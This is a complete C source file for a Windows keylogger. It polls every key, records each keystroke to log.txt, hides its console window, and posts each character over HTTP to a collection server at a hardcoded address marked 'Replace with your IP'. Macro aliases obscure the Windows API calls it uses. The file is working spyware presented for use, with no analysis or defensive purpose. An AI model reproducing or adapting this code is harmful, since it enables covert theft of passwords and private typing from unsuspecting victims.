#include <stdio.h>
#include <windows.h>
#include <stdbool.h>
#include <ctype.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

#define U8G VK_SHIFT
#define P2D VK_CAPITAL
#define P3E MapVirtualKey
#define Z9F toupper
#define X7J tolower
#define Y4G fopen
#define B8K fprintf
#define R0G fflush
#define V2Q GetAsyncKeyState
#define L0X Sleep
#define K0X GetConsoleWindow
#define N1S ShowWindow
#define S2Y SW_HIDE
#define T5R 0x8000

#define J8H "log.txt"

volatile BOOL keepRunning = TRUE;

BOOL WINAPI ConsoleHandler(DWORD signal) {
	if (signal == CTRL_C_EVENT) {
		keepRunning = FALSE;
		return TRUE;
	}
	return FALSE;
}

void send_to_server(const char* data) {
    HINTERNET hInternet = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnect(hInternet, "10.0.0.136", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);  // Replace with your IP
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/log", NULL, NULL, NULL, 0, 0);
            if (hRequest) {
                char headers[] = "Content-Type: application/x-www-form-urlencoded";
                char body[1024];
                snprintf(body, sizeof(body), "data=%s", data);
                HttpSendRequest(hRequest, headers, strlen(headers), body, strlen(body));
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}

int z1Z() {
    return (V2Q(U8G) & T5R) != 0;
}

int w5D() {
    return (V2Q(P2D) & 0x0001) != 0;
}

char o9A(int k) {
    WORD T6F = P3E(k, MAPVK_VK_TO_CHAR);

    if ((k >= 'A' && k <= 'Z') || (k >= 'a' && k <= 'z')) {
        int shiftPressed = z1Z();
        int capsLockOn = w5D();
        
        if ((shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn)) {
            return Z9F((char)T6F);
        } else {
            return X7J((char)T6F);
        }
    }

    if (z1Z()) {
        switch(k) {
            case '1': return '!';
            case '2': return '@';
            case '3': return '#';
            case '4': return '$';
            case '5': return '%';
            case '6': return '^';
            case '7': return '&';
            case '8': return '*';
            case '9': return '(';
            case '0': return ')';
            case '-': return '_';
            case '=': return '+';
            case '[': return '{';
            case ']': return '}';
            case ';': return ':';
            case '\'': return '"';
            case '`': return '~';
            case '\\': return '|';
            case ',': return '<';
            case '.': return '>';
            case '/': return '?';
        }
    }

    return (T6F >= 32 && T6F <= 126) ? (char)T6F : '\0';
}

int main() {
	SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    HWND w4C = K0X();
    N1S(w4C, S2Y);

    FILE *f7F;
    f7F = Y4G(J8H, "a+");
    if (!f7F) return 1;

    bool K1F[256] = {false};

    while (keepRunning) {
        for (int k = 8; k <= 255; k++) {
            if (V2Q(k) & T5R) {
                if (!K1F[k]) {
                    char ch = o9A(k);
                    if (ch != '\0') {
                        B8K(f7F, "%c", ch);
                        R0G(f7F);
						char packet[2] = { ch, '\0' };
						send_to_server(packet);
                    }
                    K1F[k] = true;
                }
            } else {
                K1F[k] = false;
            }
        }
        L0X(10);
    }

    fclose(f7F);
    return 0;
}
